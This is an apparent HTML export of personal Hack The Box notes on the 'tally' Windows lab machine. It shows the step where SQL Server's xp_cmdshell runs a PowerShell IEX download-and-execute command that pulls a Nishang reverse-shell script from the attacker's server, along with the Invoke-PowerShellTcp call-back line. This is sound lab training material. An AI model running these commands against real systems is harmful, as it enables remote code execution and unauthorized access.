<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>powershell IEX revshell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--tally.html">tally</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--nmap.html">nmap</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--nmap--all_ports.html">all ports</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster.html">gobuster</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint.html">sharepoint</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx.html">viewlists.aspx</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx---Documents.html">/Documents</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx--Site_Pages.html">Site Pages</a></li>
</ol>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--tally--ftp.html">ftp</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--ftp--find_._-type_f.html">find . -type f</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--tally--keepass.html">keepass</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--keepass--kpcli_-kdb_tim.kdbx.html">kpcli -kdb tim.kdbx</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--tally--smb.html">smb</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--smb--mounting_smb_account_share.html">mounting smb account share</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient.html">connecting to the smb share with smbclient</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient--zz_Archived_(dead_end).html">zz_Archived (dead end)</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient--zz_Migration-Binaries-New_Folder-tester.exe.html">zz_Migration/Binaries/New Folder/tester.exe</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell.html">sqsh interactive database shell</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--xp_cmdshell_does_not_exist.html">xp_cmdshell does not exist</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--reconfigure.html">reconfigure</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--xp_cmdshell_'whoami'.html">xp_cmdshell 'whoami'</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--powershell_IEX_revshell.html">powershell IEX revshell</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--tally--privesc_w-_juicy_potato.html">privesc w/ juicy potato</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--privesc_w-_juicy_potato--juicy_potato.html">juicy potato</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task.html">priv esc w/ scheduled task</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task--SPBestWarmUp.ps1.html">SPBestWarmUp.ps1</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task--reverse_shell.html">reverse shell</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--tally--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--tally--Lessons_Learned.html">Lessons Learned</a></li>
</ol></div>
<div class="page"><h1><b><u>powershell IEX revshell</u></b></h1><span style="color:#24ff00;">now that we have proof that </span><span style="color:#ffff00;">code execution</span><span style="color:#24ff00;"> works on this machine and know our victim is a </span><span style="color:#ffff00;">windows machine</span><span style="color:#24ff00;">, we'll have tally's sql server download and execute a </span><a href="https://github.com/samratashok/nishang">nishang powershell</a><span style="color:#24ff00;"> </span><img src="images/1727-1.png" alt="images/1727-1.png" /> that will call a reverse shell back to our attack machine<br /><br /><span style="color:#24ff00;">First, move a </span><span style="color:#ffa500;">nishang reverse shell</span><span style="color:#24ff00;">  to our working directory (don't forget to add the reverse shell call at the bottom of the script)</span><br /><span style="color:#ffa500;">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.62 -Port 9001</span><br /><img src="images/1727-2.png" alt="images/1727-2.png" /><br /><br /><span style="color:#24ff00;">and spin up an http server</span><br /><img src="images/1727-3.png" alt="images/1727-3.png" /><br /><br /><span style="color:#24ff00;">now go back to </span><span style="color:#ffa500;">sqsh</span><span style="color:#24ff00;">, renable the </span><span style="color:#ffa500;">advanced options</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">cmdshell</span><span style="color:#24ff00;">, and download our file with a </span><span style="color:#ffa500;">powershell's IEX command</span><br /><img src="images/1727-4.png" alt="images/1727-4.png" /><br /><br /><span style="color:#ffa500;">xp_cmdshell "powershell.exe IEX(new-object net.webclient).downloadstring('http://10.10.14.62/rev.ps1')"</span><br /><img src="images/1727-5.png" alt="images/1727-5.png" /><br /><br /><span style="color:#24ff00;">set up a listener on the designated port our reverse shell is coded to connect to and </span><br /><span style="color:#24ff00;"> we have our </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;">!</span><br /><img src="images/1727-6.png" alt="images/1727-6.png" /></div></div>
</body></html>